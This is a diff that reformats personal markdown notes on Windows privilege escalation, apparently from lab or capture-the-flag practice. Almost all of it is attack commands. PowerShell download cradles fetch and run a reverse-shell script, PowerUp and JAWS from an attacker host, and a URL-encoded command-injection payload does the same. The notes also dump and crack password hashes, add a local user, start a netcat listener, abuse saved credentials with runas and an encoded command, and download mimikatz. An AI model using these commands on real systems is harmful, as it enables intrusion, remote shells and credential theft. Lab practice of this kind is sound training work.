@@ -8,50 +8,69 @@ Authors: Daniel Haggerty
 ---
 
 
-```
+```powershell
 icacls scsiaccess.exe
 ...
-Everyone: (I)(F)
+# Everyone: (I)(F)
 ```
+
+```powershell
 crosscompile useradd.c
 i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 wce -w
 fgdump.exe
 type 127.0.0.1.pwdump
 john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+```
+
 Is there python on dev windows machine
 Use pyinstaller on dev windows machine
+
+```powershell
 python pyinstaller.py --onefile ms11-080.py
+```
+
 Check for powershell
+```powershell
 powershell whoami
 whaomi /priv
 cmdkey /list
-run an exploit suggesters
-If web server poke around databasel
-Check if I can write in folder
+```
+
+run exploit suggesters
+
+If web server poke around database
+
+Check if I can write in a folder
+```powershell
 echo PleaseSubsribe > test
+```
+
 1. Nishang
-2. unicorn → meterpreter from a standard shell
+2. unicorn gives a meterpreter from a standard shell
 UPGRADE TO NISHANG 1. Locate the PS > Invoke...reverse shell line in script and put at bottom so it executes in memory after transfer
-2. Server python -m SimpleHTTPServer 80
-3. powershell “IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')”
-net user dan dan /add; net local
-UNICORN
-Exploit suggesters • Sherlock.ps1
-• Powerup.ps1 → service misconfigs
-• Exploit suggester ./windows-exploit-suggester.py
-python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
-• jaws-enum.ps1
-• Empire??
-Sherlock.ps1
-windows-exploit-suggester.py
-Empire
-PowerUp.ps1
-46/67
-locate PowerUp.ps1. Copy then add “Invoke-AllChecks” to end
+2. Server `python -m SimpleHTTPServer 80`
+3. powershell `IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')`
+`net user dan dan /add; net local`
+
+## UNICORN
+Can't remember what this was now, look up...
+
+## Exploit suggester 
+- ./windows-exploit-suggester.py
+- python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
+- jaws-enum.ps1
+- Sherlock.ps1
+
+
+## Empire
+Can't remember what this was now, look up...
+- PowerUp.ps1 # service misconfigs
+locate PowerUp.ps1. Copy then add "Invoke-AllChecks" to end
 http://10.10.10.9/ippsec.php?fexec=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.11:8000/
-PowerUp.ps1%27)%20|%20powershell%20-noprofile%20-
-Run Invokes from memory as the file transferred
+PowerUp.ps1%27)%20|%20powershell%20-noprofile%20- Run Invokes from memory as the file transferred
+
+## JAWS
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
 1. jaws-enum.ps1 JAWS enumeration
 Currently stored credentials:
@@ -70,10 +89,12 @@ Currently stored credentials:
 Target: Domain:interactive=ACCESS\Administrator
 Type: Domain Password
 User: ACCESS\Administrator
+
 PS C:\Users\Public\Desktop> dir
 "ZKAccess3.5 Security System.lnk"
+
 GET FILE CONTENTS SO WE KNOW HOW TO RUN AS ADMIN
-get-Content "ZKAccess3.5 Security System.lnk" == linux “file”
+get-Content "ZKAccess3.5 Security System.lnk" == linux "file"
 $WScript = New-Object -ComObject Wscript.Shell
 $shortcut = Get-ChildItem *.lnk
 $Wscript.CreateShortcut($shortcut)
@@ -102,7 +123,8 @@ Set up listener on KALI
 nc -nlvp 9002
 runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand
 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
-Use mimikatz
+
+### Use mimikatz
 Need write access to download, go to your users desktop
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
 didnt work
@@ -121,7 +143,9 @@ d---- 8/21/2018 11:30 PM aspnet_cli
 ent
 -a--- 8/24/2018 12:33 AM 391 index.html
 -a--- 8/24/2018 8:39 PM 88712 out.jpg
-PASSWORDS cmdkey /list - is a stored pw
+
+## PASSWORDS 
+cmdkey /list - is a stored pw
 Currently stored credentials:
 Target: Domain:interactive=ACCESS\Administrator
 Type: Domain Password
